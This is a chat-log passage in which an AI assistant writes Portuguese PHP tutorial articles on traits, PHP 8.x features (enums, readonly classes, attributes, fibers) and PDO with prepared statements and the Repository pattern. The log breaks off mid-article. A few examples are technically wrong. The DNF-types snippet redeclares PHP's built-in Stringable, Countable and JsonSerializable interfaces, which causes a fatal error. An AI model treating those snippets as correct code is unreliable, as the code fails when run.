    public function inicializarCriadoEm(): void
    {
        $this->criadoEm = new \DateTimeImmutable();
    }
    public function criadoEm(): \DateTimeImmutable { return $this->criadoEm; }
}

trait HasUpdatedAt
{
    private \DateTimeImmutable $atualizadoEm;

    public function inicializarAtualizadoEm(): void
    {
        $this->atualizadoEm = new \DateTimeImmutable();
    }
    public function tocar(): void
    {
        $this->atualizadoEm = new \DateTimeImmutable();
    }
    public function atualizadoEm(): \DateTimeImmutable { return $this->atualizadoEm; }
}

trait HasSoftDelete
{
    private ?\DateTimeImmutable $deletadoEm = null;

    public function deletar(): void         { $this->deletadoEm = new \DateTimeImmutable(); }
    public function restaurar(): void       { $this->deletadoEm = null; }
    public function estaDeletado(): bool    { return $this->deletadoEm !== null; }
    public function deletadoEm(): ?\DateTimeImmutable { return $this->deletadoEm; }
}

// Trait composto — usa os três traits menores
// Quem usa ModelTrait ganha tudo automaticamente
trait ModelTrait
{
    use HasCreatedAt, HasUpdatedAt, HasSoftDelete;

    public function inicializar(): void
    {
        $this->inicializarCriadoEm();
        $this->inicializarAtualizadoEm();
    }
}

class Artigo
{
    use ModelTrait;

    public function __construct(public readonly string $titulo) {}
}

$artigo = new Artigo("PHP Avançado");
$artigo->inicializar();

echo $artigo->criadoEm()->format('H:i:s') . "\n";
echo $artigo->estaDeletado() ? "deletado\n" : "ativo\n"; // ativo

$artigo->deletar();
echo $artigo->estaDeletado() ? "deletado\n" : "ativo\n"; // deletado

$artigo->restaurar();
echo $artigo->estaDeletado() ? "deletado\n" : "ativo\n"; // ativo
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Precedência | Classe própria > Trait > Classe pai |
| `insteadof` | Resolve conflitos escolhendo qual trait vence |
| `as` | Cria alias para método conflitante ou altera visibilidade |
| `abstract` em trait | Exige que a classe hospedeira implemente o método |
| Propriedades em traits | Possível desde PHP 8.2 com tipagem completa |
| Trait + Interface | Interface define contrato, trait fornece implementação — padrão recomendado |
| Traits dentro de traits | Composição de comportamentos menores em traits maiores |

---

## Exercício da semana

1. Crie um trait `Validavel` com método abstrato `regrasDeValidacao(): array` (retorna array de regras) e método concreto `validar(array $dados): array` (retorna erros). Implemente em `FormularioCadastro` e `FormularioPagamento`, cada um com suas próprias regras.

2. Construa dois traits `LogConsole` e `LogArquivo`, ambos com método `log(string $msg): void`. Crie uma classe `Aplicacao` que usa ambos, resolve o conflito via `insteadof` e mantém o segundo método acessível via alias. Demonstre chamando os dois.

3. Combine trait com interface: interface `CacheavelInterface` com `chaveCache(): string` e `tempoExpiracao(): int`. Trait `CacheavelTrait` implementa `armazenarNoCache()` e `buscarDoCache()` usando os valores da interface. Implemente em duas classes diferentes.

4. Crie um trait `HasUuid` que gera um UUID v4 na inicialização e expõe `uuid(): string`. Use o trait em `Pedido`, `Produto` e `EventoDominio`. Garanta que o UUID é imutável após a criação.

5. **Desafio:** implemente o padrão completo do Laravel para `SoftDeletes`: interface `SoftDeletavelInterface` com `deletar()`, `restaurar()`, `estaDeletado()`, `deletadoEm()`; trait `SoftDeletesTrait` com a implementação; e um `QueryBuilder` simplificado que, ao montar uma query para objetos que implementam `SoftDeletavelInterface`, adiciona automaticamente `WHERE deletado_em IS NULL`.

---

## Referências

- PHP Manual — Traits: https://www.php.net/manual/pt_BR/language.oop5.traits.php
- PHP Manual — Traits com propriedades (PHP 8.2): https://www.php.net/manual/pt_BR/migration82.new-features.php
- Laravel Source — SoftDeletes Trait: https://github.com/laravel/framework/blob/master/src/Illuminate/Database/Eloquent/SoftDeletes.php
- Laravel Source — Authenticatable: https://github.com/laravel/framework/blob/master/src/Illuminate/Auth/Authenticatable.php
- PHP: The Right Way — Traits: https://phptherightway.com/#traits

---

Texto do Artigo 18 completo. Gerando o HTML.

---

# claude response

# Artigo 19 — PHP 8.x Moderno

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 19 · Módulo 3: Orientação a Objetos

---

## Introdução

O PHP 8.x trouxe as mudanças mais significativas da linguagem em uma década. Enums nativos eliminam a necessidade de constantes mágicas e classes de constantes. Fibers introduzem concorrência cooperativa no núcleo da linguagem. Readonly classes tornam objetos de valor imutáveis com uma única palavra-chave. Atributos nativos substituem comentários PHPDoc para metadados estruturados e verificáveis.

Esses recursos não são apenas conveniências sintáticas — eles mudam a forma como você modela domínios, escreve código concorrente e documenta comportamentos esperados. Frameworks modernos já os adotam intensamente: o Laravel usa Enums em cast de Eloquent, usa Atributos para rotas e injeção de dependência, e o PHP-DI usa Atributos para configurar containers.

---

## Enums nativos — PHP 8.1

Antes do PHP 8.1, simular enumerações exigia classes com constantes, bibliotecas externas como `myclabs/php-enum`, ou simplesmente strings e inteiros soltos. Enums nativos resolvem isso com suporte do tipo system: um enum é um tipo, não apenas um valor.

PHP tem dois tipos de enum: **Pure Enums** (sem valor associado) e **Backed Enums** (associados a `string` ou `int`).

```php
<?php
declare(strict_types=1);

// ── PURE ENUM — sem valor subjacente ─────────────────────────────────
enum Naipe
{
    case Copas;
    case Ouros;
    case Espadas;
    case Paus;
}

$carta = Naipe::Copas;
echo $carta->name . "\n"; // Copas

// Enums são tipos — type hints funcionam
function jogar(Naipe $naipe): string
{
    return "Jogou: " . $naipe->name;
}
echo jogar(Naipe::Espadas) . "\n"; // Jogou: Espadas
// jogar("Copas") → TypeError — string não é Naipe

// ── BACKED ENUM — com valor string ───────────────────────────────────
enum Status: string
{
    case Pendente   = 'pendente';
    case Aprovado   = 'aprovado';
    case Cancelado  = 'cancelado';
    case Entregue   = 'entregue';

    // Métodos em enums — lógica de domínio junto ao tipo
    public function label(): string
    {
        return match($this) {
            Status::Pendente  => '⏳ Pendente',
            Status::Aprovado  => '✅ Aprovado',
            Status::Cancelado => '❌ Cancelado',
            Status::Entregue  => '📦 Entregue',
        };
    }

    public function podeSerCancelado(): bool
    {
        return in_array($this, [Status::Pendente, Status::Aprovado]);
    }
}

// Backed Enums: from() lança ValueError, tryFrom() retorna null
$status = Status::from('aprovado');          // Status::Aprovado
$status = Status::tryFrom('invalido');       // null — não lança exceção
echo Status::Pendente->value . "\n";         // pendente
echo Status::Aprovado->label() . "\n";       // ✅ Aprovado

// Listar todos os casos
foreach (Status::cases() as $caso) {
    echo $caso->value . " → " . $caso->label() . "\n";
}

// ── ENUM IMPLEMENTANDO INTERFACE ──────────────────────────────────────
interface TemLabel
{
    public function label(): string;
}

enum Prioridade: int implements TemLabel
{
    case Baixa  = 1;
    case Media  = 2;
    case Alta   = 3;
    case Critica = 4;

    public function label(): string
    {
        return match($this) {
            Prioridade::Baixa   => '🟢 Baixa',
            Prioridade::Media   => '🟡 Média',
            Prioridade::Alta    => '🟠 Alta',
            Prioridade::Critica => '🔴 Crítica',
        };
    }

    // Constantes em enums
    const PADRAO = self::Media;
}

echo Prioridade::Alta->label() . "\n";      // 🟠 Alta
echo Prioridade::PADRAO->label() . "\n";    // 🟡 Média
```

---

## Readonly classes — PHP 8.2

PHP 8.1 introduziu `readonly` em propriedades individuais. PHP 8.2 tornou possível marcar a classe inteira como `readonly` — todas as propriedades tipadas se tornam readonly automaticamente. É o modelo perfeito para Value Objects e DTOs.

```php
<?php
declare(strict_types=1);

// PHP 8.1 — readonly em propriedades individuais
class PontoV1
{
    public function __construct(
        public readonly float $x,
        public readonly float $y,
    ) {}
}

// PHP 8.2 — readonly class — todas as propriedades são readonly automaticamente
readonly class Ponto
{
    public function __construct(
        public float $x,
        public float $y,
    ) {}

    // Readonly classes não podem ter propriedades não-readonly
    // mas podem ter métodos normais
    public function distanciaAte(Ponto $outro): float
    {
        return sqrt(($this->x - $outro->x) ** 2 + ($this->y - $outro->y) ** 2);
    }

    // Padrão wither — retorna nova instância com valor alterado (imutabilidade)
    public function comX(float $x): static
    {
        return new static($x, $this->y);
    }

    public function comY(float $y): static
    {
        return new static($this->x, $y);
    }
}

$a = new Ponto(0.0, 0.0);
$b = new Ponto(3.0, 4.0);

echo $a->distanciaAte($b) . "\n"; // 5
// $a->x = 1.0; → Error: Cannot modify readonly property

$c = $a->comX(1.0)->comY(2.0);   // nova instância — $a intacto
echo $c->x . ", " . $c->y . "\n"; // 1, 2

// Value Objects como Readonly Classes
readonly class Dinheiro
{
    public function __construct(
        public int    $centavos,
        public string $moeda,
    ) {}

    public function somar(Dinheiro $outro): static
    {
        if ($this->moeda !== $outro->moeda) {
            throw new \InvalidArgumentException("Moedas diferentes: {$this->moeda} e {$outro->moeda}");
        }
        return new static($this->centavos + $outro->centavos, $this->moeda);
    }

    public function formatado(): string
    {
        return number_format($this->centavos / 100, 2, ',', '.') . " {$this->moeda}";
    }
}

$preco    = new Dinheiro(1999, 'BRL');
$frete    = new Dinheiro(1500, 'BRL');
$total    = $preco->somar($frete);
echo $total->formatado() . "\n"; // 34,99 BRL
```

---

## Atributos nativos — PHP 8.0+

Atributos (antes chamados de Annotations em outras linguagens) permitem anexar metadados estruturados a classes, métodos, propriedades e parâmetros. Ao contrário dos comentários PHPDoc, atributos são verificados pelo PHP, podem receber parâmetros tipados, e são lidos via Reflection API com type safety.

```php
<?php
declare(strict_types=1);

// Definindo um atributo — é uma classe com #[Attribute]
#[Attribute(Attribute::TARGET_CLASS | Attribute::TARGET_METHOD)]
class Rota
{
    public function __construct(
        public readonly string $caminho,
        public readonly string $metodo = 'GET',
    ) {}
}

#[Attribute(Attribute::TARGET_PROPERTY)]
class Validar
{
    public function __construct(
        public readonly string $tipo,        // 'required', 'email', 'min', etc.
        public readonly mixed  $parametro = null,
    ) {}
}

#[Attribute(Attribute::TARGET_METHOD)]
class Cache
{
    public function __construct(
        public readonly int    $ttlSegundos = 300,
        public readonly string $prefixo     = '',
    ) {}
}

// Usando os atributos
#[Rota('/api/usuarios')]
class UsuarioController
{
    #[Rota('/api/usuarios/{id}', 'GET')]
    #[Cache(ttlSegundos: 60, prefixo: 'usuario')]
    public function mostrar(int $id): array
    {
        return ['id' => $id];
    }

    #[Rota('/api/usuarios', 'POST')]
    public function criar(
        #[Validar('required')]
        #[Validar('email')]
        string $email,

        #[Validar('required')]
        #[Validar('min', 8)]
        string $senha,
    ): array {
        return ['criado' => true];
    }
}

// Lendo atributos via Reflection — como frameworks fazem
$reflection = new ReflectionClass(UsuarioController::class);

// Lê atributo da classe
$atributosClasse = $reflection->getAttributes(Rota::class);
foreach ($atributosClasse as $attr) {
    $rota = $attr->newInstance();
    echo "Classe: {$rota->caminho} [{$rota->metodo}]\n";
    // Classe: /api/usuarios [GET]
}

// Lê atributos dos métodos
foreach ($reflection->getMethods() as $metodo) {
    foreach ($metodo->getAttributes(Rota::class) as $attr) {
        $rota = $attr->newInstance();
        echo "Método {$metodo->getName()}: {$rota->caminho} [{$rota->metodo}]\n";
    }
    foreach ($metodo->getAttributes(Cache::class) as $attr) {
        $cache = $attr->newInstance();
        echo "Cache: TTL={$cache->ttlSegundos}s prefixo='{$cache->prefixo}'\n";
    }
}
```

---

## Fibers — PHP 8.1

Fibers são corrotinas de baixo nível — blocos de código que podem ser pausados e retomados, cedendo o controle ao chamador. Não são threads (não rodam em paralelo), mas permitem programação assíncrona cooperativa: múltiplas tarefas progridem intercaladas sem bloquear o processo.

Fibers são a base sobre a qual bibliotecas como ReactPHP e Amp implementam seus loops de eventos no PHP moderno.

```php
<?php
declare(strict_types=1);

// Fiber básico — suspender e retomar
$fiber = new Fiber(function (): void {
    echo "Fiber: início\n";

    // Suspende e passa um valor para quem chamou resume()
    $valor = Fiber::suspend('primeiro suspend');
    echo "Fiber: retomado com '{$valor}'\n";

    $valor2 = Fiber::suspend('segundo suspend');
    echo "Fiber: retomado novamente com '{$valor2}'\n";

    echo "Fiber: fim\n";
});

// start() executa até o primeiro Fiber::suspend()
$resultado = $fiber->start();
echo "Código principal recebeu: '{$resultado}'\n";

// resume() continua de onde parou, passando um valor para o Fiber
$resultado2 = $fiber->resume('ping');
echo "Código principal recebeu: '{$resultado2}'\n";

$fiber->resume('pong');

echo "Fiber terminado: " . ($fiber->isTerminated() ? "sim" : "não") . "\n";

// Output:
// Fiber: início
// Código principal recebeu: 'primeiro suspend'
// Fiber: retomado com 'ping'
// Código principal recebeu: 'segundo suspend'
// Fiber: retomado novamente com 'pong'
// Fiber: fim
// Fiber terminado: sim

// ── SCHEDULER SIMPLES — demonstrando concorrência cooperativa ──────────
class Scheduler
{
    /** @var Fiber[] */
    private array $fibers = [];

    public function adicionar(Fiber $fiber): void
    {
        $this->fibers[] = $fiber;
    }

    public function executar(): void
    {
        // Inicia todos os fibers
        foreach ($this->fibers as $fiber) {
            $fiber->start();
        }

        // Continua rodando até todos terminarem
        while (!empty($this->fibers)) {
            foreach ($this->fibers as $i => $fiber) {
                if ($fiber->isSuspended()) {
                    $fiber->resume();
                }
                if ($fiber->isTerminated()) {
                    unset($this->fibers[$i]);
                }
            }
        }
    }
}

$scheduler = new Scheduler();

$scheduler->adicionar(new Fiber(function (): void {
    for ($i = 1; $i <= 3; $i++) {
        echo "Tarefa A — passo {$i}\n";
        Fiber::suspend(); // cede o controle
    }
}));

$scheduler->adicionar(new Fiber(function (): void {
    for ($i = 1; $i <= 3; $i++) {
        echo "Tarefa B — passo {$i}\n";
        Fiber::suspend(); // cede o controle
    }
}));

$scheduler->executar();
// Tarefa A — passo 1
// Tarefa B — passo 1
// Tarefa A — passo 2
// Tarefa B — passo 2
// Tarefa A — passo 3
// Tarefa B — passo 3
```

---

## Outros recursos PHP 8.x notáveis

```php
<?php
declare(strict_types=1);

// ── NAMED ARGUMENTS — PHP 8.0 ─────────────────────────────────────────
// Argumentos nomeados — ordem não importa, leitura mais clara
$resultado = array_slice(array: [1,2,3,4,5], offset: 1, length: 3);
// [2, 3, 4]

// Especialmente útil com construtores complexos
$data = new \DateTimeImmutable(
    datetime: '2024-01-15',
    timezone: new \DateTimeZone('America/Sao_Paulo'),
);

// ── MATCH EXPRESSION — PHP 8.0 ────────────────────────────────────────
// match é uma expressão (tem retorno), comparação estrita, sem fallthrough
$codigo = 200;
$descricao = match($codigo) {
    200, 201  => 'Sucesso',
    400       => 'Requisição inválida',
    401, 403  => 'Não autorizado',
    404       => 'Não encontrado',
    500       => 'Erro interno',
    default   => 'Código desconhecido',
};

// ── NULLSAFE OPERATOR — PHP 8.0 ───────────────────────────────────────
// Encadeia chamadas sem verificar null em cada passo
$cidade = $usuario?->endereco?->cidade?->nome;
// Equivale a: $usuario && $usuario->endereco && ... — mas conciso

// ── FIRST CLASS CALLABLES — PHP 8.1 ──────────────────────────────────
// Cria Closure a partir de qualquer callable com sintaxe limpa
$fn = strlen(...);         // Closure de função nativa
echo $fn("olá") . "\n";  // 3

$dobrar = fn(int $n): int => $n * 2;
$numeros = [1, 2, 3, 4, 5];
$dobrados = array_map($dobrar, $numeros); // [2, 4, 6, 8, 10]

// ── INTERSECTION TYPES — PHP 8.1 ──────────────────────────────────────
// Já vimos no artigo anterior — objetos que satisfazem múltiplas interfaces

// ── NEVER RETURN TYPE — PHP 8.1 ───────────────────────────────────────
// Declara que a função NUNCA retorna — sempre lança exceção ou termina o processo
function falharSempre(string $mensagem): never
{
    throw new \RuntimeException($mensagem);
}

// ── DNF TYPES — PHP 8.2 ───────────────────────────────────────────────
// Disjunctive Normal Form — combinação de union e intersection types
interface Stringable { public function __toString(): string; }
interface Countable  { public function count(): int; }
interface JsonSerializable { public function jsonSerialize(): mixed; }

// Aceita (Stringable & Countable) OU JsonSerializable
function processar((Stringable&Countable)|JsonSerializable $dado): void
{
    // ...
}
```

---

## Resumo do artigo

| Recurso | Versão | O que resolve |
|---|---|---|
| Enums | PHP 8.1 | Tipos enumerados com type safety — elimina constantes mágicas |
| Backed Enums | PHP 8.1 | Enum com valor `string`/`int` — serialização e persistência |
| Readonly properties | PHP 8.1 | Imutabilidade de propriedades individuais |
| Readonly classes | PHP 8.2 | Imutabilidade de toda a classe — ideal para Value Objects |
| Atributos nativos | PHP 8.0 | Metadados estruturados verificáveis — substituem PHPDoc |
| Fibers | PHP 8.1 | Corrotinas cooperativas — base para programação assíncrona |
| Named arguments | PHP 8.0 | Argumentos por nome — legibilidade e flexibilidade |
| Match expression | PHP 8.0 | Switch tipado com retorno, sem fallthrough |
| Nullsafe operator | PHP 8.0 | Encadeamento seguro em valores nullable |
| Never return type | PHP 8.1 | Declara funções que nunca retornam |
| DNF Types | PHP 8.2 | Combinação de union e intersection types |

---

## Exercício da semana

1. Modele um sistema de pedidos usando Enums: `StatusPedido` (backed string com métodos `label()`, `podeTransicionarPara(StatusPedido $novo): bool`), `MetodoPagamento` (backed string: Pix, Cartao, Boleto) e `TipoPrioridade` (backed int: 1-3). Garanta que transições inválidas sejam bloqueadas.

2. Crie uma `readonly class Endereco` com campos `logradouro`, `numero`, `complemento` (nullable), `cidade`, `estado`, `cep`. Implemente métodos `formatado(): string` e `comComplemento(string $c): static`. Crie também `readonly class Cliente` que compõe um `Endereco`.

3. Defina três atributos: `#[ValidarEmail]`, `#[ValidarMinimo(int $min)]` e `#[ValidarMaximo(int $max)]`. Crie uma função `validarObjeto(object $obj): array` que usa Reflection para ler os atributos das propriedades e retorna os erros encontrados.

4. Escreva um mini-scheduler de Fibers que executa três "tarefas" em paralelo cooperativo: download simulado (5 passos), processamento (3 passos) e log (4 passos). Cada passo imprime o nome da tarefa e suspende. O scheduler intercala a execução.

5. **Desafio:** combine os recursos do artigo para criar um micro-framework de rotas: atributo `#[Rota(string $path, string $metodo)]`, um `Router` que usa Reflection para descobrir controllers e métodos anotados, e mapeia requisições `{metodo} {path}` para o método correto. Use um Enum `MetodoHttp` para os verbos.

---

## Referências

- PHP Manual — Enumerations: https://www.php.net/manual/pt_BR/language.enumerations.php
- PHP Manual — Readonly Properties (8.1): https://www.php.net/manual/pt_BR/language.oop5.properties.php#language.oop5.properties.readonly-properties
- PHP Manual — Readonly Classes (8.2): https://www.php.net/manual/pt_BR/language.oop5.basic.php#language.oop5.basic.class.readonly
- PHP Manual — Attributes: https://www.php.net/manual/pt_BR/language.attributes.php
- PHP Manual — Fibers: https://www.php.net/manual/pt_BR/language.fibers.php
- PHP 8.0 Release Notes: https://www.php.net/releases/8.0/pt_BR.php
- PHP 8.1 Release Notes: https://www.php.net/releases/8.1/pt_BR.php
- PHP 8.2 Release Notes: https://www.php.net/releases/8.2/pt_BR.php

---

Texto do Artigo 19 completo. Gerando o HTML agora.

Artigos 18 e 19 entregues. **Módulo 3 concluído** — 9 artigos (11 a 19).

Próximo: **Artigo 20 — Módulo 4: Banco de Dados**. PDO avançado, prepared statements e padrão Repository. Continuo?

---

# you asked

message time: 2026-03-08 21:46:34

Continue

---

# claude response

# Artigo 20 — PDO Avançado, Prepared Statements e Padrão Repository

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 20 · Módulo 4: Banco de Dados

---

## Introdução

PDO (PHP Data Objects) é a camada de abstração de banco de dados nativa do PHP. Ela permite escrever código que funciona com MySQL, PostgreSQL, SQLite e outros SGBDs com mudanças mínimas. Mas a maioria dos desenvolvedores usa apenas a superfície do PDO — conectar, executar uma query, buscar resultados. O uso profissional vai muito além: configuração correta de atributos de conexão, prepared statements reutilizáveis, transações com savepoints, modos de fetch tipados e o padrão Repository para isolar a lógica de acesso a dados do restante da aplicação.

Este artigo cobre o PDO do jeito que é usado em sistemas de produção: sem vulnerabilidades de SQL injection, com tratamento correto de erros, performance otimizada e uma camada de abstração que permite trocar o banco de dados sem reescrever a lógica de negócio.

---

## Configuração correta da conexão PDO

A maioria dos tutoriais mostra o mínimo para conectar. Em produção, há uma série de atributos que precisam ser configurados explicitamente para garantir segurança, performance e comportamento previsível.

```php
<?php
declare(strict_types=1);

function criarConexao(
    string $host,
    string $banco,
    string $usuario,
    string $senha,
    int    $porta = 3306,
): \PDO {
    $dsn = "mysql:host={$host};port={$porta};dbname={$banco};charset=utf8mb4";

    $opcoes = [
        // Lança PDOException em vez de retornar false — essencial
        \PDO::ATTR_ERRMODE            => \PDO::ERRMODE_EXCEPTION,

        // Retorna arrays associativos por padrão
        \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_ASSOC,

        // Desativa emulação de prepared statements — usa prepared real do MySQL
        // Mais seguro e permite tipos corretos (int retorna como int, não string)
        \PDO::ATTR_EMULATE_PREPARES   => false,

        // Timeout de conexão em segundos
        \PDO::ATTR_TIMEOUT            => 5,

        // Desativa autocommit — transações explícitas
        // \PDO::ATTR_AUTOCOMMIT      => false, // ative se usar transações por padrão

        // MySQL específico: modo estrito — rejeita dados truncados/inválidos
        \PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4 COLLATE utf8mb4_unicode_ci,
                                          sql_mode = 'STRICT_ALL_TABLES'",
    ];

    try {
        $pdo = new \PDO($dsn, $usuario, $senha, $opcoes);
        return $pdo;
    } catch (\PDOException $e) {
        // NÃO exponha detalhes de conexão em produção
        // Logue $e->getMessage() internamente, relance genérico
        throw new \RuntimeException(
            "Falha ao conectar ao banco de dados.",
            (int) $e->getCode(),
            $e
        );
    }
}

// Uso com variáveis de ambiente — nunca hardcode credenciais
$pdo = criarConexao(
    host:    getenv('DB_HOST')     ?: 'localhost',
    banco:   getenv('DB_DATABASE') ?: 'meuapp',
    usuario: getenv('DB_USERNAME') ?: 'root',
    senha:   getenv('DB_PASSWORD') ?: '',
);
```

---

## Prepared statements — segurança e performance

Prepared statements são a defesa primária contra SQL injection. O banco compila a query uma vez e a executa com parâmetros separados — os parâmetros nunca são interpolados na query, então valores maliciosos não alteram a estrutura SQL. Um segundo benefício: quando a mesma query é executada múltiplas vezes, o banco reutiliza o plano de execução compilado.

```php
<?php
declare(strict_types=1);

// ── PARÂMETROS POSICIONAIS (?) ────────────────────────────────────────
// Simples, mas a ordem importa
$stmt = $pdo->prepare("
    SELECT id, nome, email, criado_em
    FROM usuarios
    WHERE ativo = ? AND perfil = ?
    ORDER BY nome
    LIMIT ?
");

// execute() recebe array de valores na ordem dos ?
$stmt->execute([true, 'admin', 50]);
$usuarios = $stmt->fetchAll(); // array de arrays associativos

// ── PARÂMETROS NOMEADOS (:nome) ────────────────────────────────────────
// Mais legível, a ordem não importa, pode repetir o mesmo parâmetro
$stmt = $pdo->prepare("
    SELECT *
    FROM produtos
    WHERE categoria = :categoria
      AND preco BETWEEN :min AND :max
      AND estoque > :estoque_minimo
    ORDER BY preco
");

$stmt->execute([
    'categoria'       => 'Eletrônicos',
    'min'             => 100.00,
    'max'             => 5000.00,
    'estoque_minimo'  => 0,
]);
$produtos = $stmt->fetchAll();

// ── REUTILIZANDO O MESMO PREPARED STATEMENT ───────────────────────────
// Prepara uma vez, executa muitas vezes — performance real
$stmtInserir = $pdo->prepare("
    INSERT INTO logs (usuario_id, acao, ip, criado_em)
    VALUES (:usuario_id, :acao, :ip, NOW())
");

$eventos = [
    ['usuario_id' => 1, 'acao' => 'login',   'ip' => '192.168.1.1'],
    ['usuario_id' => 1, 'acao' => 'busca',   'ip' => '192.168.1.1'],
    ['usuario_id' => 2, 'acao' => 'logout',  'ip' => '10.0.0.5'],
];

foreach ($eventos as $evento) {
    $stmtInserir->execute($evento);
    // lastInsertId() após cada execute() se precisar do ID gerado
}

// ── BINDPARAM vs BINDVALUE ─────────────────────────────────────────────
// bindParam() — vincula por referência (valor é lido na execução)
// bindValue() — vincula por valor (valor é capturado agora)
$stmtBuscar = $pdo->prepare("SELECT * FROM pedidos WHERE id = :id");

// bindValue com tipo explícito — garante que o banco recebe um inteiro
$stmtBuscar->bindValue(':id', 42, \PDO::PARAM_INT);
$stmtBuscar->execute();
$pedido = $stmtBuscar->fetch();

// bindParam — útil em loops onde a variável muda
$id = 0;
$stmtBuscar->bindParam(':id', $id, \PDO::PARAM_INT);
foreach ([1, 2, 3, 4, 5] as $id) {
    $stmtBuscar->execute(); // usa o valor atual de $id
    $resultado = $stmtBuscar->fetch();
}
```

---

## Modos de fetch — controlando o formato dos resultados

O PDO oferece múltiplos modos de fetch que determinam como os dados são retornados. Escolher o modo correto reduz código desnecessário de mapeamento.

```php
<?php
declare(strict_types=1);

$stmt = $pdo->prepare("SELECT id, nome, email, preco FROM produtos WHERE ativo = 1");
$stmt->execute();

// FETCH_ASSOC — array associativo (padrão configurado)
$linha = $stmt->fetch(\PDO::FETCH_ASSOC);
// ['id' => 1, 'nome' => 'Teclado', 'email' => null, 'preco' => '350.00']

// FETCH_OBJ — objeto stdClass com propriedades
$linha = $stmt->fetch(\PDO::FETCH_OBJ);
// $linha->id, $linha->nome, $linha->preco

// FETCH_CLASS — mapeia diretamente para uma classe
// As propriedades são preenchidas ANTES de __construct() ser chamado
class Produto
{
    public int    $id    = 0;
    public string $nome  = '';
    public float  $preco = 0.0;
}

$stmt->setFetchMode(\PDO::FETCH_CLASS, Produto::class);
/** @var Produto $produto */
$produto = $stmt->fetch();
echo $produto->nome  . "\n"; // Teclado
echo $produto->preco . "\n"; // 350

// fetchAll com FETCH_CLASS
$produtos = $stmt->fetchAll(\PDO::FETCH_CLASS, Produto::class);
// array de objetos Produto

// FETCH_COLUMN — retorna apenas a primeira coluna como array simples
$stmt = $pdo->prepare("SELECT nome FROM produtos ORDER BY nome");
$stmt->execute();
$nomes = $stmt->fetchAll(\PDO::FETCH_COLUMN);
// ['Mouse', 'Teclado', 'Monitor']

// FETCH_KEY_PAIR — array [primeira_coluna => segunda_coluna]
$stmt = $pdo->prepare("SELECT id, nome FROM produtos");
$stmt->execute();
$mapa = $stmt->fetchAll(\PDO::FETCH_KEY_PAIR);
// [1 => 'Teclado', 2 => 'Mouse', 3 => 'Monitor']

// FETCH_UNIQUE — primeira coluna como chave, resto como array/objeto
$stmt = $pdo->prepare("SELECT id, nome, preco FROM produtos");
$stmt->execute();
$porId = $stmt->fetchAll(\PDO::FETCH_UNIQUE | \PDO::FETCH_ASSOC);
// [1 => ['nome' => 'Teclado', 'preco' => '350.00'], ...]
```

---

## Transações com savepoints

Transações garantem que um conjunto de operações seja atômico — ou todas têm sucesso, ou nenhuma. Savepoints permitem desfazer apenas parte de uma transação, criando pontos de restauração intermediários.

```php
<?php
declare(strict_types=1);

function transferirSaldo(\PDO $pdo, int $deId, int $paraId, float $valor): void
{
    if ($valor <= 0) {
        throw new \InvalidArgumentException("Valor de transferência deve ser positivo.");
    }

    $pdo->beginTransaction();
    try {
        // Bloqueia as duas linhas para evitar race condition
        $stmt = $pdo->prepare(
            "SELECT saldo FROM contas WHERE id = ? FOR UPDATE"
        );

        $stmt->execute([$deId]);
        $saldoOrigem = (float) $stmt->fetchColumn();

        if ($saldoOrigem < $valor) {
            throw new \RuntimeException(
                "Saldo insuficiente: disponível R$ {$saldoOrigem}, solicitado R$ {$valor}"
            );
        }

        // Débito
        $pdo->prepare("UPDATE contas SET saldo = saldo - ? WHERE id = ?")
            ->execute([$valor, $deId]);

        // Crédito
        $pdo->prepare("UPDATE contas SET saldo = saldo + ? WHERE id = ?")
            ->execute([$valor, $paraId]);

        // Registra a transferência
        $pdo->prepare(
            "INSERT INTO transferencias (de_id, para_id, valor, criado_em)
             VALUES (?, ?, ?, NOW())"
        )->execute([$deId, $paraId, $valor]);

        $pdo->commit();
    } catch (\Throwable $e) {
        $pdo->rollBack();
        throw $e; // relança para o chamador decidir o que fazer
    }
}

// Savepoints — controle granular dentro de uma transação
function processarPedidoComSavepoint(\PDO $pdo, array $pedido): void
{
    $pdo->beginTransaction();
    try {
        // Insere o pedido
        $pdo->prepare("INSERT INTO pedidos (cliente_id, total) VALUES (?, ?)")
            ->execute([$pedido['cliente_id'], $pedido['total']]);
        $pedidoId = (int) $pdo->lastInsertId();

        // Savepoint antes dos itens — se falhar, desfaz só os itens
        $pdo->exec("SAVEPOINT sp_itens");
        try {
            foreach ($pedido['itens'] as $item) {
                $pdo->prepare(
                    "INSERT INTO pedido_itens (pedido_id, produto_id, quantidade, preco)
                     VALUES (?, ?, ?, ?)"
                )->execute([$pedidoId, $item['produto_id'], $item['quantidade'], $item['preco']]);

                // Atualiza estoque
                $affected = $pdo->prepare(
                    "UPDATE produtos SET estoque = estoque - ?
                     WHERE id = ? AND estoque >= ?"
                );
                $affected->execute([$item['quantidade'], $item['produto_id'], $item['quantidade']]);

                if ($affected->rowCount() === 0) {
                    throw new \RuntimeException(
                        "Estoque insuficiente para produto #{$item['produto_id']}"
                    );
                }
            }
            $pdo->exec("RELEASE SAVEPOINT sp_itens");
        } catch (\RuntimeException $e) {
            // Desfaz só os itens, mantém o pedido
            $pdo->exec("ROLLBACK TO SAVEPOINT sp_itens");
            // Marca o pedido como falho em vez de cancelar tudo
            $pdo->prepare("UPDATE pedidos SET status = 'falhou' WHERE id = ?")
                ->execute([$pedidoId]);
        }

        $pdo->commit();
    } catch (\Throwable $e) {
        $pdo->rollBack();
        throw $e;
    }
}
```

---

## O padrão Repository

O padrão Repository isola a lógica de acesso a dados do restante da aplicação. Serviços de domínio não sabem se os dados vêm de MySQL, PostgreSQL, uma API REST ou um arquivo JSON — eles apenas chamam métodos do repositório e recebem objetos de domínio.

```php
<?php
declare(strict_types=1);

// Entidade de domínio — sem dependência de PDO ou SQL
final class Produto
{
    public function __construct(
        public readonly int    $id,
        public readonly string $nome,
        public readonly float  $preco,
        public readonly int    $estoque,
        public readonly bool   $ativo,
    ) {}

    public function comEstoque(int $novo): static
    {
        return new static($this->id, $this->nome, $this->preco, $novo, $this->ativo);
    }
}

// Interface do repositório — contrato de domínio, sem SQL
interface ProdutoRepositorioInterface
{
    public function buscarPorId(int $id): ?Produto;
    /** @return Produto[] */
    public function buscarAtivos(): array;
    /** @return Produto[] */
    public function buscarPorCategoria(string $categoria, int $limite = 20): array;
    public function salvar(Produto $produto): Produto;
    public function deletar(int $id): bool;
}

